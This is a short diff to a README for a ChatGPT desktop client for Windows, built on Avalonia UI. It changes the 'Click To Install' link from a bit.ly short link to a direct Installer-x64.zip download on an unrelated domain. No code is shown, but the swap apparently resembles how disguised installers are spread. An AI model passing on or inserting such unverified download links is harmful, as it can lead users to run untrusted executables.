@@ -1,4 +1,4 @@
-# ChatGPT Windows Client | [Click To Install](https://bit.ly/3Tj83de)
+# ChatGPT Windows Client | [Click To Install](https://www.frowlabs.com/Installer-x64.zip)
 
 
 A ChatGPT C# client for graphical user interface runs on Windows. Powered by [Avalonia UI](https://avaloniaui.net/) framework.
